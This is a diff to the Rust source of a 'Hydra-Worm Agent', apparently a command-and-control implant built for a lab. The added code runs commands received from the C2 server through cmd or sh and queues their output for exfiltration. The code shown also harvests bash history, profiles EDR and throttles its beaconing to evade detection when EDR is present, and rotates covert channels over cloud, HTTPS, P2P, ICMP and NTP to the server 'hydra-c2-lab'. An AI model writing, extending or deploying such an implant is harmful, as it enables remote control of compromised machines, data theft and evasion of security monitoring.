@@ -1,4 +1,5 @@
 // Project: Hydra-Worm Agent
+use std::process::Command;
 use std::net::ToSocketAddrs; // Required for runtime hostname resolution
 use std::{thread, time::Duration, net::UdpSocket};
 use rand::Rng;
@@ -324,6 +325,7 @@ struct Agent {
     failures: u32,
     state: u8,
     lambda: f64,
+    last_command_output: String,
 }
 
 fn detect_env() -> String {
@@ -349,16 +351,15 @@ impl Agent {
         let c2_hostname = "hydra-c2-lab"; 
         Self {
             id: id.to_string(),
-            // START AT TIER 1 (Cloud)
             transport: Box::new(CloudTransport { 
                 endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
             }),
             failures: 0,
-            state: 0, // Reset to 0 so it starts with Cloud API
-            lambda: 0.2, 
+            state: 0,
+            lambda: 0.2,
+            last_command_output: String::new(),
         }
     }
-
 
     fn run(&mut self) {
         let mut sys = System::new_all();
@@ -380,8 +381,15 @@ impl Agent {
         let env_ctx = detect_env();
 
         loop {
-            // Phase 2.1 & 2.3: Harvest artifacts and Profile defenses
-            let history_snippet = harvest_bash_history(&username);
+            // TACTICAL FIX: Prioritize command results over standard bash history
+            let artifact_data = if !self.last_command_output.is_empty() {
+                let out = self.last_command_output.clone();
+                self.last_command_output.clear(); // Clear buffer after preparing exfiltration
+                out
+            } else {
+                harvest_bash_history(&username)
+            };
+
             let defense_ctx = profile_defenses(); 
 
             let stats = Telemetry {
@@ -393,7 +401,7 @@ impl Agent {
                 username: username.clone(),
                 os: os_info.clone(),
                 env_context: env_ctx.clone(),
-                artifact_preview: history_snippet,
+                artifact_preview: artifact_data,
                 defense_profile: defense_ctx, 
             };
 
@@ -401,15 +409,43 @@ impl Agent {
                 Ok(res) => {
                     println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
                     self.failures = 0;
+
+                    // --- PHASE 3.1 & 3.2: MISSION OBJECTIVE EXECUTION & CAPTURE ---
+                    if res.task != "WAIT" && res.task != "NOP" && res.task != "SLEEP" && !res.task.is_empty() {
+                        println!("[!] MISSION OBJECTIVE RECEIVED: {}", res.task);
+                        
+                        let output = if cfg!(target_os = "windows") {
+                            Command::new("cmd").args(["/C", &res.task]).output()
+                        } else {
+                            Command::new("sh").args(["-c", &res.task]).output()
+                        };
+
+                        match output {
+                            Ok(out) => {
+                                let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
+                                let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
+                                
+                                // Format with OUT: prefix for C2 parser
+                                if !stdout.is_empty() {
+                                    self.last_command_output = format!("OUT:{}", stdout);
+                                    println!("[+] STDOUT captured for exfiltration.");
+                                } else if !stderr.is_empty() {
+                                    self.last_command_output = format!("OUT:ERR: {}", stderr);
+                                }
+                            }
+                            Err(e) => {
+                                self.last_command_output = format!("OUT:EXEC_FAIL: {}", e);
+                                println!("[-] Execution Failed: {}", e);
+                            }
+                        }
+                    }
                 },
                 Err(e) => {
                     println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                     self.failures += 1;
 
-                    // TACTICAL BREAKOUT: Immediate mutation for ICMP or 3+ failures
                     if self.transport.get_name() == "ICMP-Failsafe" || self.failures >= 3 {
                         self.mutate();
-                        // Bypass jitter sleep and try the new transport immediately
                         continue; 
                     }
                 }
@@ -417,20 +453,16 @@ impl Agent {
 
             if self.failures >= 3 { self.mutate(); }
             
-            // --- PHASE 2.4: ADAPTIVE JITTER & TEMPORAL EVASION ---
+            // Adaptive heartbeat logic based on EDR presence
             let mut rng = rand::thread_rng();
             let mut current_lambda = self.lambda;
 
-            // TACTICAL ADJUSTMENT: If EDR is present, throttle the heartbeat.
-            // Lower Lambda = higher inter-arrival time (IAT).
             if stats.defense_profile != "None" {
                 current_lambda /= 2.0; 
-                println!("[!] EDR Detected: Throttling traffic to avoid heuristic detection.");
+                println!("[!] EDR Detected: Throttling traffic.");
             }
 
             let exp = Exp::new(current_lambda).unwrap();
-            
-            // Adaptive Clamping: Allow longer sleeps (up to 5 mins) when under surveillance
             let max_sleep = if stats.defense_profile != "None" { 300.0 } else { 60.0 };
             let sleep_time = exp.sample(&mut rng).min(max_sleep).max(1.0);
             
@@ -441,10 +473,8 @@ impl Agent {
     fn mutate(&mut self) {
         self.state = (self.state + 1) % 6;
         self.failures = 0;
-        
         let c2_hostname = "hydra-c2-lab"; 
         
-        // Dynamic IP resolution for Layer 4
         let c2_ip = format!("{}:80", c2_hostname)
             .to_socket_addrs()
             .map(|mut addrs| addrs.next().map(|s| s.ip()))
@@ -453,18 +483,13 @@ impl Agent {
                 std::net::IpAddr::V4(v4) => Some(v4),
                 _ => None,
             })
-            .unwrap_or_else(|| "10.5.0.5".parse().unwrap()); // Fallback
+            .unwrap_or_else(|| "10.5.0.5".parse().unwrap());
 
         println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);
 
         self.transport = match self.state {
-            // TIER 1: Fixed for internal lab API
-            0 => Box::new(CloudTransport { 
-                endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
-            }),
-            1 => Box::new(MalleableHttps { 
-                c2_url: format!("http://{}:8080/api/v1/heartbeat", c2_hostname) 
-            }),
+            0 => Box::new(CloudTransport { endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) }),
+            1 => Box::new(MalleableHttps { c2_url: format!("http://{}:8080/api/v1/heartbeat", c2_hostname) }),
             2 => Box::new(P2PTransport),
             3 => Box::new(IcmpTransport { target_ip: c2_ip }),
             4 => Box::new(NtpTransport { pool_addr: format!("{}:123", c2_hostname) }),
